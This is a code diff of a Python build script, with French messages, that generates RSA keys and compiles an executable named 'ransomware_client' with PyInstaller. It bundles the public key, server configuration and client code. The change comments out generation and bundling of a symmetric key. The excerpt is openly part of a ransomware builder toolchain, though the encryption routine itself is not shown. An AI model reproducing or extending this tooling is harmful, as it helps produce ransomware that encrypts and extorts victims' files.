@@ -68,13 +68,13 @@ def generate_rsa_keys():
     print(Fore.GREEN + "Clés RSA générées et sauvegardées avec succès.")
     return private_key, public_key
 
-def generate_symmetric_key():
+""" def generate_symmetric_key():
     print(Fore.CYAN + "Génération de la clé symétrique...")
     symmetric_key = os.urandom(32)
     with open(os.path.join('keys', 'symmetric_key.bin'), 'wb') as key_file:
         key_file.write(symmetric_key)
     print(Fore.GREEN + "Clé symétrique générée et sauvegardée avec succès.")
-    return symmetric_key
+    return symmetric_key """
 
 def compile_executable():
     print(Fore.CYAN + "Compilation de l'exécutable...")
@@ -88,7 +88,7 @@ def compile_executable():
     process = subprocess.Popen([
         'pyinstaller', '--onefile', '--name=ransomware_client',
         '--add-data', 'keys/public_key.pem:keys',
-        '--add-data', 'keys/symmetric_key.bin:keys',
+        #'--add-data', 'keys/symmetric_key.bin:keys',
         '--add-data', 'server/config.ini:server',
         '--add-data', 'client:client',  # Inclure tout le répertoire client
         '--add-data', 'utils.py:.',
@@ -160,7 +160,7 @@ def main():
 
     # Générer les clés
     generate_rsa_keys()
-    generate_symmetric_key()
+    #generate_symmetric_key()
 
     # Compiler l'exécutable
     compile_executable()
